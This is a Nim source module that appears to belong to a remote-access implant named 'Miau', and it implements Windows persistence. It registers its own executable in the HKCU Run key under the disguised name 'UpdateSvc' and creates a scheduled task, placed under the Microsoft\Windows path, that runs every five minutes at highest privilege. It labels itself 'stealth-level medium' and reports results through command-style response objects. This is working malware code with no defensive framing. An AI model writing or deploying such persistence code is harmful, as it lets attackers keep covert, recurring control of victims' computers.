## Miau persistence: registry Run key + scheduled task. Stealth-level medium.
import os, std/strutils, std/osproc
import miau_codec, commands

proc selfPath(): string =
  result = getAppFilename()
  if result.len == 0:
    result = paramStr(0)

proc installRegistry*(): ExecResult =
  ## HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateSvc -> exe
  let exe = selfPath()
  let key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  let cmd = "reg add \"" & key & "\" /v UpdateSvc /t REG_SZ /d \"" & exe & "\" /f"
  try:
    discard execProcess("reg.exe", args = @["add", key, "/v", "UpdateSvc",
                                           "/t", "REG_SZ", "/d", exe, "/f"])
    result = ExecResult(status: RESP_OK, message: "registry persistence installed", data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc removeRegistry*(): ExecResult =
  let key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  try:
    discard execProcess("reg.exe", args = @["delete", key, "/v", "UpdateSvc", "/f"])
    result = ExecResult(status: RESP_OK, message: "registry persistence removed", data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc installTask*(): ExecResult =
  ## Scheduled task every 5 min (hidden, run only when logged on).
  let exe = selfPath()
  try:
    discard execProcess("schtasks.exe", args = @[
      "/Create", "/TN", "\\Microsoft\\Windows\\MiauSvc",
      "/TR", exe, "/SC", "MINUTE", "/MO", "5",
      "/F", "/RL", "HIGHEST",
    ])
    result = ExecResult(status: RESP_OK, message: "task installed", data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc removeTask*(): ExecResult =
  try:
    discard execProcess("schtasks.exe", args = @["/Delete", "/TN",
                                                 "\\Microsoft\\Windows\\MiauSvc", "/F"])
    result = ExecResult(status: RESP_OK, message: "task removed", data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc installAll*(): ExecResult =
  let r = installRegistry()
  if r.status != RESP_OK: return r
  discard installTask()
  result = ExecResult(status: RESP_OK, message: "persistence installed (run + task)", data: "", final: true)

proc removeAll*(): ExecResult =
  discard removeRegistry()
  discard removeTask()
  result = ExecResult(status: RESP_OK, message: "persistence removed", data: "", final: true)
